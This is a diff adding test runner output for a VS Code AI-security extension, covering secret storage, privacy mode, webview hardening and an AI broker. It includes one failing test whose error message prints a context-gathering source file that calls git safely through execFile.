+    # Subtest: token is stored via context.secrets, never logged
+    ok 1 - token is stored via context.secrets, never logged
+      ---
+      duration_ms: 1.2066
+      type: 'test'
+      ...
+    # Subtest: vault key and canary tokens live in SecretStorage, not globalState/logs
+    ok 2 - vault key and canary tokens live in SecretStorage, not globalState/logs
+      ---
+      duration_ms: 0.5258
+      type: 'test'
+      ...
+    1..2
+ok 88 - SecretStorage token hygiene (\#6)
+  ---
+  duration_ms: 2.0907
+  type: 'suite'
+  ...
+# Subtest: Launch readiness command surface
+    # Subtest: declares and registers launch-critical command names
+    ok 1 - declares and registers launch-critical command names
+      ---
+      duration_ms: 0.6486
+      type: 'test'
+      ...
+    # Subtest: keeps friendly launch aliases mapped to implemented scanners
+    ok 2 - keeps friendly launch aliases mapped to implemented scanners
+      ---
+      duration_ms: 0.5248
+      type: 'test'
+      ...
+    # Subtest: has build and lint scripts required by release automation
+    ok 3 - has build and lint scripts required by release automation
+      ---
+      duration_ms: 3.3156
+      type: 'test'
+      ...
+    1..3
+ok 89 - Launch readiness command surface
+  ---
+  duration_ms: 7.6446
+  type: 'suite'
+  ...
+# Subtest: Marketplace README media hygiene
+    # Subtest: shows verified VS Code evidence screenshots in the Marketplace README
+    ok 1 - shows verified VS Code evidence screenshots in the Marketplace README
+      ---
+      duration_ms: 1.4216
+      type: 'test'
+      ...
+    # Subtest: embeds the real-product README demo GIF (22-GIF-RECORDING-KIT contract)
+    ok 2 - embeds the real-product README demo GIF (22-GIF-RECORDING-KIT contract)
+      ---
+      duration_ms: 0.992
+      type: 'test'
+      ...
+    1..2
+ok 90 - Marketplace README media hygiene
+  ---
+  duration_ms: 2.8616
+  type: 'suite'
+  ...
+# Subtest: Local-first privacy mode
+    # Subtest: declares soterai.privacyMode with local default
+    ok 1 - declares soterai.privacyMode with local default
+      ---
+      duration_ms: 1.1562
+      type: 'test'
+      ...
+    # Subtest: prevents telemetry flush in local mode and untrusted workspaces
+    ok 2 - prevents telemetry flush in local mode and untrusted workspaces
+      ---
+      duration_ms: 0.8881
+      type: 'test'
+      ...
+    # Subtest: health reports never include raw secrets or prompt text
+    ok 3 - health reports never include raw secrets or prompt text
+      ---
+      duration_ms: 0.5717
+      type: 'test'
+      ...
+    # Subtest: privacy guarantee explains local-only secret handling
+    ok 4 - privacy guarantee explains local-only secret handling
+      ---
+      duration_ms: 0.5513
+      type: 'test'
+      ...
+    # Subtest: README gives a marketplace-grade local privacy proof
+    ok 5 - README gives a marketplace-grade local privacy proof
+      ---
+      duration_ms: 0.8777
+      type: 'test'
+      ...
+    # Subtest: trust checklist and product matrix lock the reviewer-facing privacy contract
+    ok 6 - trust checklist and product matrix lock the reviewer-facing privacy contract
+      ---
+      duration_ms: 0.7731
+      type: 'test'
+      ...
+    1..6
+ok 91 - Local-first privacy mode
+  ---
+  duration_ms: 6.0786
+  type: 'suite'
+  ...
+# Subtest: Clipboard safety for firewall handlers (\#1)
+    # Subtest: all firewall clipboard writes go through redactForSharing or a canary token by design
+    ok 1 - all firewall clipboard writes go through redactForSharing or a canary token by design
+      ---
+      duration_ms: 0.9819
+      type: 'test'
+      ...
+    1..1
+ok 92 - Clipboard safety for firewall handlers (\#1)
+  ---
+  duration_ms: 1.2019
+  type: 'suite'
+  ...
+# Subtest: Webview hardening (\#7)
+    # Subtest: all webviews declare a Content-Security-Policy
+    ok 1 - all webviews declare a Content-Security-Policy
+      ---
+      duration_ms: 1.9531
+      type: 'test'
+      ...
+    # Subtest: webviews escape finding fields before HTML interpolation
+    ok 2 - webviews escape finding fields before HTML interpolation
+      ---
+      duration_ms: 0.6705
+      type: 'test'
+      ...
+    # Subtest: firewall info webviews disable scripts
+    ok 3 - firewall info webviews disable scripts
+      ---
+      duration_ms: 0.7753
+      type: 'test'
+      ...
+    # Subtest: dashboard message handler keeps a strict command allowlist including new actions
+    ok 4 - dashboard message handler keeps a strict command allowlist including new actions
+      ---
+      duration_ms: 1.1083
+      type: 'test'
+      ...
+    # Subtest: dashboard surfaces the 9+ trust center without overstating enforcement
+    ok 5 - dashboard surfaces the 9+ trust center without overstating enforcement
+      ---
+      duration_ms: 1.123
+      type: 'test'
+      ...
+    1..5
+ok 93 - Webview hardening (\#7)
+  ---
+  duration_ms: 13.7988
+  type: 'suite'
+  ...
+# Subtest: Enterprise policy export
+    # Subtest: exports a buyer-ready enterprise policy bundle with honest enforcement scope
+    ok 1 - exports a buyer-ready enterprise policy bundle with honest enforcement scope
+      ---
+      duration_ms: 0.9924
+      type: 'test'
+      ...
+    1..1
+ok 94 - Enterprise policy export
+  ---
+  duration_ms: 1.2499
+  type: 'suite'
+  ...
+# Subtest: Broker auto-start wiring (activation actually turns protection on)
+    # Subtest: activate() starts the broker, not just constructs one
+    ok 1 - activate() starts the broker, not just constructs one
+      ---
+      duration_ms: 0.9542
+      type: 'test'
+      ...
+    # Subtest: does not await the start, so a slow broker cannot hang activation
+    ok 2 - does not await the start, so a slow broker cannot hang activation
+      ---
+      duration_ms: 0.8942
+      type: 'test'
+      ...
+    # Subtest: exposes an opt-out that is declared, machine-scoped, and restricted
+    ok 3 - exposes an opt-out that is declared, machine-scoped, and restricted
+      ---
+      duration_ms: 15.8291
+      type: 'test'
+      ...
+    # Subtest: never fails silently — every non-started outcome notifies the user
+    ok 4 - never fails silently — every non-started outcome notifies the user
+      ---
+      duration_ms: 3.8524
+      type: 'test'
+      ...
+    # Subtest: withholds the provider key in a restricted workspace
+    ok 5 - withholds the provider key in a restricted workspace
+      ---
+      duration_ms: 1.7024
+      type: 'test'
+      ...
+    1..5
+ok 95 - Broker auto-start wiring (activation actually turns protection on)
+  ---
+  duration_ms: 23.8746
+  type: 'suite'
+  ...
+# Subtest: Local AI Broker, Safe Mode, and Memory Inspector
+    # Subtest: declares and registers every new command
+    ok 1 - declares and registers every new command
+      ---
+      duration_ms: 0.7774
+      type: 'test'
+      ...
+    # Subtest: stores broker/provider tokens in SecretStorage and fixes the host to loopback
+    ok 2 - stores broker/provider tokens in SecretStorage and fixes the host to loopback
+      ---
+      duration_ms: 0.51
+      type: 'test'
+      ...
+    # Subtest: never injects a token or provider key into a webview
+    ok 3 - never injects a token or provider key into a webview
+      ---
+      duration_ms: 0.693
+      type: 'test'
+      ...
+    # Subtest: redacts Memory Inspector exports and trust-gates provider configuration
+    ok 4 - redacts Memory Inspector exports and trust-gates provider configuration
+      ---
+      duration_ms: 0.6793
+      type: 'test'
+      ...
+    # Subtest: warns on raw terminals and routes users to controlled broker execution
+    ok 5 - warns on raw terminals and routes users to controlled broker execution
+      ---
+      duration_ms: 0.676
+      type: 'test'
+      ...
+    # Subtest: surfaces extension isolation through the authenticated broker preflight
+    ok 6 - surfaces extension isolation through the authenticated broker preflight
+      ---
+      duration_ms: 0.4297
+      type: 'test'
+      ...
+    1..6
+ok 96 - Local AI Broker, Safe Mode, and Memory Inspector
+  ---
+  duration_ms: 4.4184
+  type: 'suite'
+  ...
+# Subtest: Command-palette hygiene (clutter control)
+    # Subtest: core commands are always palette-visible (not gated)
+    ok 1 - core commands are always palette-visible (not gated)
+      ---
+      duration_ms: 0.5398
+      type: 'test'
+      ...
+    # Subtest: keeps the default palette to a small set of clear, reversible newcomer workflows
+    ok 2 - keeps the default palette to a small set of clear, reversible newcomer workflows
+      ---
+      duration_ms: 0.3578
+      type: 'test'
+      ...
+    # Subtest: every non-core declared command is gated behind soterai.advancedCommands (or fully hidden)
+    ok 3 - every non-core declared command is gated behind soterai.advancedCommands (or fully hidden)
+      ---
+      duration_ms: 0.5835
+      type: 'test'
+      ...
+    # Subtest: the context key is driven by stable and experimental command visibility settings
+    ok 4 - the context key is driven by stable and experimental command visibility settings
+      ---
+      duration_ms: 0.6028
+      type: 'test'
+      ...
+    1..4
+ok 97 - Command-palette hygiene (clutter control)
+  ---
+  duration_ms: 2.7108
+  type: 'suite'
+  ...
+# Subtest: Onboarding walkthrough (UX)
+    # Subtest: contributes a Getting Started walkthrough with 3 value-first steps
+    ok 1 - contributes a Getting Started walkthrough with 3 value-first steps
+      ---
+      duration_ms: 0.6861
+      type: 'test'
+      ...
+    # Subtest: every walkthrough step points to an existing markdown media file
+    ok 2 - every walkthrough step points to an existing markdown media file
+      ---
+      duration_ms: 1.5809
+      type: 'test'
+      ...
+    # Subtest: every walkthrough command button targets a declared or built-in command
+    ok 3 - every walkthrough command button targets a declared or built-in command
+      ---
+      duration_ms: 5.139
+      type: 'test'
+      ...
+    # Subtest: declares onWalkthrough activation and a registered openWalkthrough command
+    ok 4 - declares onWalkthrough activation and a registered openWalkthrough command
+      ---
+      duration_ms: 0.5919
+      type: 'test'
+      ...
+    # Subtest: opens the walkthrough only once via a globalState onboarding flag
+    ok 5 - opens the walkthrough only once via a globalState onboarding flag
+      ---
+      duration_ms: 0.9633
+      type: 'test'
+      ...
+    1..5
+ok 98 - Onboarding walkthrough (UX)
+  ---
+  duration_ms: 10.044
+  type: 'suite'
+  ...
+# Subtest: Live inline scanning + Quick Fixes (UX)
+    # Subtest: does not pass a ThemeIcon id as a decoration file URI
+    ok 1 - does not pass a ThemeIcon id as a decoration file URI
+      ---
+      duration_ms: 1.1565
+      type: 'test'
+      ...
+    # Subtest: declares soterai.liveScan.enabled defaulting to on and registers the scanner
+    ok 2 - declares soterai.liveScan.enabled defaulting to on and registers the scanner
+      ---
+      duration_ms: 0.6595
+      type: 'test'
+      ...
+    # Subtest: uses a debounced, local-only scan mapped to a DiagnosticCollection
+    ok 3 - uses a debounced, local-only scan mapped to a DiagnosticCollection
+      ---
+      duration_ms: 0.7293
+      type: 'test'
+      ...
+    # Subtest: skips non-file schemes, oversized files, and excluded globs
+    ok 4 - skips non-file schemes, oversized files, and excluded globs
+      ---
+      duration_ms: 0.4285
+      type: 'test'
+      ...
+    # Subtest: offers redact + copy-safe Quick Fixes and gates the internal fix command
+    ok 5 - offers redact + copy-safe Quick Fixes and gates the internal fix command
+      ---
+      duration_ms: 0.8556
+      type: 'test'
+      ...
+    # Subtest: redaction never writes raw secrets and disposes its timers
+    ok 6 - redaction never writes raw secrets and disposes its timers
+      ---
+      duration_ms: 0.4553
+      type: 'test'
+      ...
+    1..6
+ok 99 - Live inline scanning + Quick Fixes (UX)
+  ---
+  duration_ms: 5.1763
+  type: 'suite'
+  ...
+# Subtest: Clipboard / paste guard (UX)
+    # Subtest: registers scanClipboard (core) and safePaste (advanced) commands
+    ok 1 - registers scanClipboard (core) and safePaste (advanced) commands
+      ---
+      duration_ms: 0.5753
+      type: 'test'
+      ...
+    # Subtest: scans clipboard locally and offers a redacted safe version
+    ok 2 - scans clipboard locally and offers a redacted safe version
+      ---
+      duration_ms: 0.4564
+      type: 'test'
+      ...
+    # Subtest: safe paste can insert a redacted version instead of the raw clipboard
+    ok 3 - safe paste can insert a redacted version instead of the raw clipboard
+      ---
+      duration_ms: 0.2824
+      type: 'test'
+      ...
+    # Subtest: never logs the raw clipboard value
+    ok 4 - never logs the raw clipboard value
+      ---
+      duration_ms: 0.2667
+      type: 'test'
+      ...
+    1..4
+ok 100 - Clipboard / paste guard (UX)
+  ---
+  duration_ms: 2.0191
+  type: 'suite'
+  ...
+# Subtest: Security search guardrails
+    # Subtest: does not use console.log in extension source
+    ok 1 - does not use console.log in extension source
+      ---
+      duration_ms: 1.1353
+      type: 'test'
+      ...
+    # Subtest: documents every child process boundary as non-shell fixed argv usage
+    not ok 2 - documents every child process boundary as non-shell fixed argv usage
+      ---
+      duration_ms: 4.3712
+      type: 'test'
+      location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\extension.test.ts:2:35472'
+      failureType: 'testCodeFailure'
+      error: |-
+        The input did not match the regular expression /Safe child process boundary/. Input:
+        
+        'import * as vscode from "vscode";\r\n' +
+          'import { execFile } from "child_process";\r\n' +
+          'import { promisify } from "util";\r\n' +
+          'import * as path from "node:path";\r\n' +
+          'import type { ContextItem, ContextKind } from "@soterai/guard-core";\r\n' +
+          'import { assertWorkspaceFileUri } from "../security/WorkspacePathGuard";\r\n' +
+          'import { BoundarySnapshot } from "../ai-boundary/BoundarySnapshot";\r\n' +
+          'import { readBoundaryFile } from "../ai-boundary/readFile";\r\n' +
+          '\r\n' +
+          'const execFileAsync = promisify(execFile);\r\n' +
+          '\r\n' +
+          "const MAX_ITEM_BYTES = 64 * 1024; // don't stream huge files into a prompt bundle\r\n" +
+          '\r\n' +
+          '/**\r\n' +
+          ' * Optional protected-file checker (wired to WorkspaceGuard at activation).\r\n' +
+          ' * When set, protected files are EXCLUDED from every SoterAI-built context\r\n' +
+          ' * bundle — this is the enforced half of Protected Workspace Mode. Paths other\r\n' +
+          ' * tools read directly remain monitoring-only.\r\n' +
+          ' */\r\n' +
+          'let isProtectedPath: ((relPath: string) => boolean) | undefined;\r\n' +
+          'export function setProtectedFileChecker(checker: (relPath: string) => boolean): void {\r\n' +
+          '    isProtectedPath = checker;\r\n' +
+          '}\r\n' +
+          '\r\n' +
+          '/** Context source config files an AI assistant commonly reads. */\r\n' +
+          'const AGENT_CONFIG_FILES = [\r\n' +
+          '    "README.md",\r\n' +
+          '    "CLAUDE.md",\r\n' +
+          '    ".cursorrules",\r\n' +
+          '    ".github/copilot-instructions.md",\r\n' +
+          '    ".mcp.json",\r\n' +
+          '    ".vscode/mcp.json",\r\n' +
+          '    ".cursor/mcp.json",\r\n' +
+          '];\r\n' +
+          '\r\n' +
+          'function kindForPath(rel: string): ContextKind {\r\n' +
+          '    if (/(^|\\/)(README|CLAUDE)\\.md$/i.test(rel)) return "readme";\r\n' +
+          '    if (/cursorrules|copilot-instructions/i.test(rel)) return "agent_config";\r\n' +
+          '    if (/mcp\\.json$/i.test(rel)) return "mcp_config";\r\n' +
+          '    return "other";\r\n' +
+          '}\r\n' +
+          '\r\n' +
+          '/**\r\n' +
+          ' * Gather the raw context a user is likely about to hand an AI assistant:\r\n' +
+          ' * selection, active file, open tabs, git diff, and agent/MCP config files.\r\n' +
+          ' * The RAW content is only used to build a SAFE bundle downstream — it is never\r\n' +
+          ' * persisted by this gatherer.\r\n' +
+          ' */\r\n' +
+          'export async function gatherContext(): Promise<ContextItem[]> {\r\n' +
+          '    const boundary = await BoundarySnapshot.load();\r\n' +
+          '    const items: ContextItem[] = [];\r\n' +
+          '    const seen = new Set<string>();\r\n' +
+          '    let totalBytes = 0;\r\n' +
+          '    const allowed = (uri: vscode.Uri) => !boundary.blocks(uri) && !isProtectedPath?.(vscode.workspace.asRelativePath(uri));\r\n' +
+          '    const push = (item?: ContextItem) => {\r\n' +
+          '        if (!item || seen.has(`${item.kind}:${item.path}`) || items.length >= 128) return;\r\n' +
+          '        // Enforced exclusion: files on the Protected Workspace list never enter\r\n' +
+          '        // a SoterAI-built context bundle.\r\n' +
+          '        if (isProtectedPath?.(item.path)) return;\r\n' +
+          '        const size = Buffer.byteLength(item.content, "utf8");\r\n' +
+          '        if (size > MAX_ITEM_BYTES || totalBytes + size > 1024 * 1024) return;\r\n' +
+          '        totalBytes += size;\r\n' +
+          '        seen.add(`${item.kind}:${item.path}`);\r\n' +
+          '        items.push(item);\r\n' +
+          '    };\r\n' +
+          '    const readItem = async (uri: vscode.Uri, kind: ContextKind): Promise<ContextItem | undefined> => {\r\n' +
+          '        if (!allowed(uri)) return undefined; // deny before reading bytes\r\n' +
+          '        try {\r\n' +
+          '            const content = await boundary.read(uri);\r\n' +
+          '            return { path: vscode.workspace.asRelativePath(uri), kind, content };\r\n' +
+          '        } catch { return undefined; }\r\n' +
+          '    };\r\n' +
+          '\r\n' +
+          '    const editor = vscode.window.activeTextEditor;\r\n' +
+          '    let editorAllowed = false;\r\n' +
+          '    if (editor && editor.document.uri.scheme === "file" && allowed(editor.document.uri)) {\r\n' +
+          '        try {\r\n' +
+          '            await assertWorkspaceFileUri(editor.document.uri);\r\n' +
+          '            const folder = vscode.workspace.getWorkspaceFolder(editor.document.uri)!;\r\n' +
+          '            // Also reject hardlink aliases and oversized/binary files for open editors.\r\n' +
+          '            await readBoundaryFile(folder.uri.fsPath, editor.document.uri.fsPath);\r\n' +
+          '            editorAllowed = true;\r\n' +
+          '        } catch {\r\n' +
+          '            // An external/symlinked editor is excluded, but safe open tabs and\r\n' +
+          '            // workspace config files can still be gathered below.\r\n' +
+          '        }\r\n' +
+          '    }\r\n' +
+          '\r\n' +
+          '    // Selection (highest signal).\r\n' +
+          '    if (editor && editorAllowed && !editor.selection.isEmpty && !boundary.hasRegions(editor.document.uri)) {\r\n' +
+          '        push({\r\n' +
+          '            path: vscode.workspace.asRelativePath(editor.document.uri),\r\n' +
+          '            kind: "selection",\r\n' +
+          '            content: editor.document.getText(editor.selection),\r\n' +
+          '        });\r\n' +
+          '    }\r\n' +
+          '\r\n' +
+          '    // Active file.\r\n' +
+          '    if (editor && editorAllowed) {\r\n' +
+          '        push({\r\n' +
+          '            path: vscode.workspace.asRelativePath(editor.document.uri),\r\n' +
+          '            kind: "active_file",\r\n' +
+          '            // Sanitize the complete document before any size check: truncating first\r\n' +
+          '            // would invalidate region offsets or expose a truncated credential.\r\n' +
+          '            content: boundary.sanitize(editor.document.uri, editor.document.getText()),\r\n' +
+          '        });\r\n' +
+          '    }\r\n' +
+          '\r\n' +
+          '    // Open tabs.\r\n' +
+          '    for (const group of vscode.window.tabGroups.all) {\r\n' +
+          '        for (const tab of group.tabs) {\r\n' +
+          '            const input = tab.input as { uri?: vscode.Uri } | undefined;\r\n' +
+          '            if (input?.uri && input.uri.scheme === "file") {\r\n' +
+          '                push(await readItem(input.uri, "open_tab"));\r\n' +
+          '            }\r\n' +
+          '        }\r\n' +
+          '    }\r\n' +
+          '\r\n' +
+          '    for (const folder of vscode.workspace.workspaceFolders ?? []) {\r\n' +
+          '        if (folder.uri.scheme !== "file") continue;\r\n' +
+          '        // Diff content retains its real path. Never collect a whole-repository\r\n' +
+          "        // patch under a synthetic label that evades path/region rules. Git's\r\n" +
+          '        // external diff and textconv helpers are disabled; no shell is invoked.\r\n' +
+          '        if (vscode.workspace.isTrusted) {\r\n' +
+          '            for (const staged of [false, true]) {\r\n' +
+          '                try {\r\n' +
+          '                    const args = ["--no-pager", "--literal-pathspecs", "diff", "--no-ext-diff", "--no-textconv", "--no-renames", ...(staged ? ["--cached"] : [])];\r\n' +
+          '                    const options = { cwd: folder.uri.fsPath, maxBuffer: MAX_ITEM_BYTES, timeout: 2000, windowsHide: true };\r\n' +
+          '                    const { stdout } = await execFileAsync("git", [...args, "--name-only", "-z", "--"], options);\r\n' +
+          '                    for (const rel of stdout.split("\\0").filter(Boolean).slice(0, 128)) {\r\n' +
+          '                        const uri = vscode.Uri.file(path.resolve(folder.uri.fsPath, rel));\r\n' +
+          '                        if (!allowed(uri) || boundary.hasRegions(uri) || items.length >= 128) continue;\r\n' +
+          '                        // Missing/deleted/aliased files cannot be verified and are omitted.\r\n' +
+          '                        await readBoundaryFile(folder.uri.fsPath, uri.fsPath);\r\n' +
+          '                        const { stdout: diff } = await execFileAsync("git", [...args, "--", rel], options);\r\n' +
+          '                        if (diff) push({ path: vscode.workspace.asRelativePath(uri), kind: "git_diff", content: diff });\r\n' +
+          '                    }\r\n' +
+          '                } catch { /* Unverifiable diff fails closed; other sources remain usable. */ }\r\n' +
+          '            }\r\n' +
+          '        }\r\n' +
+          '        // Agent/MCP config files.\r\n' +
+          '        for (const rel of AGENT_CONFIG_FILES) {\r\n' +
+          '            const uri = vscode.Uri.joinPath(folder.uri, rel);\r\n' +
+          '            push(await readItem(uri, kindForPath(rel)));\r\n' +
+          '        }\r\n' +
+          '    }\r\n' +
+          '\r\n' +
+          '    return items;\r\n' +
+          '}\r\n'
+        
+      code: 'ERR_ASSERTION'
+      name: 'AssertionError'
+      expected:
+      actual: |-
+        import * as vscode from "vscode";
+        import { execFile } from "child_process";
+        import { promisify } from "util";
+        import * as path from "node:path";
+        import type { ContextItem, ContextKind } from "@soterai/guard-core";
+        import { assertWorkspaceFileUri } from "../security/WorkspacePathGuard";
+        import { BoundarySnapshot } from "../ai-boundary/BoundarySnapshot";
+        import { readBoundaryFile } from "../ai-boundary/readFile";
+        
+        const execFileAsync = promisify(execFile);
+        
+        const MAX_ITEM_BYTES = 64 * 1024; // don't stream huge files into a prompt bundle
+        
+        /**
+         * Optional protected-file checker (wired to WorkspaceGuard at activation).
+         * When set, protected files are EXCLUDED from every SoterAI-built context
+         * bundle — this is the enforced half of Protected Workspace Mode. Paths other
+         * tools read directly remain monitoring-only.
+         */
+        let isProtectedPath: ((relPath: string) => boolean) | undefined;
+        export function setProtectedFileChecker(checker: (relPath: string) => boolean): void {
+            isProtectedPath = checker;
+        }
+        
+        /** Context source config files an AI assistant commonly reads. */
+        const AGENT_CONFIG_FILES = [
+            "README.md",
+            "CLAUDE.md",
+            ".cursorrules",
+            ".github/copilot-instructions.md",
+            ".mcp.json",
+            ".vscode/mcp.json",
+            ".cursor/mcp.json",
+        ];
+        
+        function kindForPath(rel: string): ContextKind {
+            if (/(^|\/)(README|CLAUDE)\.md$/i.test(rel)) return "readme";
+            if (/cursorrules|copilot-instructions/i.test(rel)) return "agent_config";
+            if (/mcp\.json$/i.test(rel)) return "mcp_config";
+            return "other";
+        }
+        
+        /**
+         * Gather the raw context a user is likely about to hand an AI assistant:
+         * selection, active file, open tabs, git diff, and agent/MCP config files.
+         * The RAW content is only used to build a SAFE bundle downstream — it is never
+         * persisted by this gatherer.
+         */
+        export async function gatherContext(): Promise<ContextItem[]> {
+            const boundary = await BoundarySnapshot.load();
+            const items: ContextItem[] = [];
+            const seen = new Set<string>();
+            let totalBytes = 0;
+            const allowed = (uri: vscode.Uri) => !boundary.blocks(uri) && !isProtectedPath?.(vscode.workspace.asRelativePath(uri));
+            const push = (item?: ContextItem) => {
+                if (!item || seen.has(`${item.kind}:${item.path}`) || items.length >= 128) return;
+                // Enforced exclusion: files on the Protected Workspace list never enter
+                // a SoterAI-built context bundle.
+                if (isProtectedPath?.(item.path)) return;
+                const size = Buffer.byteLength(item.content, "utf8");
+                if (size > MAX_ITEM_BYTES || totalBytes + size > 1024 * 1024) return;
+                totalBytes += size;
+                seen.add(`${item.kind}:${item.path}`);
+                items.push(item);
+            };
+            const readItem = async (uri: vscode.Uri, kind: ContextKind): Promise<ContextItem | undefined> => {
+                if (!allowed(uri)) return undefined; // deny before reading bytes
+                try {
+                    const content = await boundary.read(uri);
+                    return { path: vscode.workspace.asRelativePath(uri), kind, content };
+                } catch { return undefined; }
+            };
+        
+            const editor = vscode.window.activeTextEditor;
+            let editorAllowed = false;
+            if (editor && editor.document.uri.scheme === "file" && allowed(editor.document.uri)) {
+                try {
+                    await assertWorkspaceFileUri(editor.document.uri);
+                    const folder = vscode.workspace.getWorkspaceFolder(editor.document.uri)!;
+                    // Also reject hardlink aliases and oversized/binary files for open editors.
+                    await readBoundaryFile(folder.uri.fsPath, editor.document.uri.fsPath);
+                    editorAllowed = true;
+                } catch {
+                    // An external/symlinked editor is excluded, but safe open tabs and
+                    // workspace config files can still be gathered below.
+                }
+            }
+        
+            // Selection (highest signal).
+            if (editor && editorAllowed && !editor.selection.isEmpty && !boundary.hasRegions(editor.document.uri)) {
+                push({
+                    path: vscode.workspace.asRelativePath(editor.document.uri),
+                    kind: "selection",
+                    content: editor.document.getText(editor.selection),
+                });
+            }
+        
+            // Active file.
+            if (editor && editorAllowed) {
+                push({
+                    path: vscode.workspace.asRelativePath(editor.document.uri),
+                    kind: "active_file",
+                    // Sanitize the complete document before any size check: truncating first
+                    // would invalidate region offsets or expose a truncated credential.
+                    content: boundary.sanitize(editor.document.uri, editor.document.getText()),
+                });
+            }
+        
+            // Open tabs.
+            for (const group of vscode.window.tabGroups.all) {
+                for (const tab of group.tabs) {
+                    const input = tab.input as { uri?: vscode.Uri } | undefined;
+                    if (input?.uri && input.uri.scheme === "file") {
+                        push(await readItem(input.uri, "open_tab"));
+                    }
+                }
+            }
+        
+            for (const folder of vscode.workspace.workspaceFolders ?? []) {
+                if (folder.uri.scheme !== "file") continue;
+                // Diff content retains its real path. Never collect a whole-repository
+                // patch under a synthetic label that evades path/region rules. Git's
+                // external diff and textconv helpers are disabled; no shell is invoked.
+                if (vscode.workspace.isTrusted) {
+                    for (const staged of [false, true]) {
+                        try {
+                            const args = ["--no-pager", "--literal-pathspecs", "diff", "--no-ext-diff", "--no-textconv", "--no-renames", ...(staged ? ["--cached"] : [])];
+                            const options = { cwd: folder.uri.fsPath, maxBuffer: MAX_ITEM_BYTES, timeout: 2000, windowsHide: true };
+                            const { stdout } = await execFileAsync("git", [...args, "--name-only", "-z", "--"], options);
+                            for (const rel of stdout.split("\0").filter(Boolean).slice(0, 128)) {
+                                const uri = vscode.Uri.file(path.resolve(folder.uri.fsPath, rel));
+                                if (!allowed(uri) || boundary.hasRegions(uri) || items.length >= 128) continue;
+                                // Missing/deleted/aliased files cannot be verified and are omitted.
+                                await readBoundaryFile(folder.uri.fsPath, uri.fsPath);
+                                const { stdout: diff } = await execFileAsync("git", [...args, "--", rel], options);
+                                if (diff) push({ path: vscode.workspace.asRelativePath(uri), kind: "git_diff", content: diff });
+                            }
+                        } catch { /* Unverifiable diff fails closed; other sources remain usable. */ }
+                    }
+                }
+                // Agent/MCP config files.
+                for (const rel of AGENT_CONFIG_FILES) {
+                    const uri = vscode.Uri.joinPath(folder.uri, rel);
+                    push(await readItem(uri, kindForPath(rel)));
+                }
+            }
+        
+            return items;
+        }
+        
+      operator: 'match'
+      stack: |-
+        TestContext.<anonymous> (C:\Users\USER\OneDrive\Desktop\Ai-Agent-Security-Guard\packages\vscode-extension\src\__tests__\extension.test.ts:662:16)
+        Test.runInAsyncScope (node:async_hooks:214:14)
+        Test.run (node:internal/test_runner/test:1047:25)
+        Suite.processPendingSubtests (node:internal/test_runner/test:744:18)
+        Test.postRun (node:internal/test_runner/test:1173:19)
+        Test.run (node:internal/test_runner/test:1101:12)
+        async Promise.all (index 0)
+        async Suite.run (node:internal/test_runner/test:1442:7)
+        async Test.processPendingSubtests (node:internal/test_runner/test:744:7)
+      ...
+    1..2
+not ok 101 - Security search guardrails
+  ---
+  duration_ms: 7.0796
+  type: 'suite'
+  location: 'C:\\Users\\USER\\OneDrive\\Desktop\\Ai-Agent-Security-Guard\\packages\\vscode-extension\\src\\__tests__\\extension.test.ts:2:35236'
+  failureType: 'subtestsFailed'
+  error: '1 subtest failed'
+  code: 'ERR_TEST_FAILURE'
+  ...
+# Subtest: Control Panel (consolidated sidebar toggles)
+    # Subtest: declares the control panel as a webview view in the SoterAI sidebar
+    ok 1 - declares the control panel as a webview view in the SoterAI sidebar
+      ---
+      duration_ms: 0.662
+      type: 'test'
+      ...
+    # Subtest: registers the webview view provider with the matching viewType
+    ok 2 - registers the webview view provider with the matching viewType
+      ---
+      duration_ms: 0.5083
+      type: 'test'
+      ...
+    # Subtest: every toggle delegates to a command or setting that actually exists
+    ok 3 - every toggle delegates to a command or setting that actually exists
+      ---
+      duration_ms: 0.6903
+      type: 'test'
+      ...
+    # Subtest: Phase 11: five primary workflows are allowlisted and wired to real commands
+    ok 4 - Phase 11: five primary workflows are allowlisted and wired to real commands
+      ---
+      duration_ms: 0.5823
+      type: 'test'
+      ...
+    # Subtest: uses the central protection state instead of an any-toggle ENFORCED roll-up
+    ok 5 - uses the central protection state instead of an any-toggle ENFORCED roll-up
+      ---
+      duration_ms: 0.7107
+      type: 'test'
+      ...
+    # Subtest: exposes one primary Full Protection action and persistent lockdown recovery
+    ok 6 - exposes one primary Full Protection action and persistent lockdown recovery
+      ---
+      duration_ms: 0.9121
+      type: 'test'
+      ...
+    # Subtest: resolves live-scan and MCP badges from CAPABILITY_REGISTRY (no stronger claim than registry)
+    ok 7 - resolves live-scan and MCP badges from CAPABILITY_REGISTRY (no stronger claim than registry)
+      ---
+      duration_ms: 1.2987
+      type: 'test'
+      ...
+    # Subtest: rejects webview messages outside the allowlist
+    ok 8 - rejects webview messages outside the allowlist
+      ---
+      duration_ms: 0.4803
+      type: 'test'
+      ...
+    # Subtest: never sends secrets or raw content to the webview
+    ok 9 - never sends secrets or raw content to the webview
+      ---
+      duration_ms: 0.6288
+      type: 'test'
+      ...
+    1..9
+ok 102 - Control Panel (consolidated sidebar toggles)
+  ---
+  duration_ms: 7.3527
+  type: 'suite'
+  ...
+# Subtest: IntegrationAdapter detect + propose
+    # Subtest: detects openai-compatible config and extracts base URL
+    ok 1 - detects openai-compatible config and extracts base URL
+      ---
+      duration_ms: 9.6898
+      type: 'test'
+      ...
+    # Subtest: proposes a rewrite to loopback broker without writing
+    ok 2 - proposes a rewrite to loopback broker without writing
+      ---
+      duration_ms: 2.3416
+      type: 'test'
+      ...
+    1..2
+ok 103 - IntegrationAdapter detect + propose
+  ---
+  duration_ms: 26.1993
+  type: 'suite'
+  ...
+# Subtest: IntegrationAdapter apply + restore (never silent)
+    # Subtest: refuses to write without approval
+    ok 1 - refuses to write without approval
+      ---
+      duration_ms: 10.5508
+      type: 'test'
+      ...
+    # Subtest: apply + restore round-trip preserves original content
+    ok 2 - apply + restore round-trip preserves original content
+      ---
+      duration_ms: 2.8185
+      type: 'test'
+      ...
+    # Subtest: never writes the pre-rewrite copy of a secret file to the filesystem
+    ok 3 - never writes the pre-rewrite copy of a secret file to the filesystem
+      ---
+      duration_ms: 3.9059
+      type: 'test'
+      ...
+    # Subtest: leaves the original untouched when the backup sink fails
+    ok 4 - leaves the original untouched when the backup sink fails
+      ---
+      duration_ms: 1.0137
+      type: 'test'
+      ...
+    # Subtest: refuses apply when file drifted since proposal
+    ok 5 - refuses apply when file drifted since proposal
+      ---
+      duration_ms: 0.815
+      type: 'test'
+      ...
+    # Subtest: refuses restore without approval
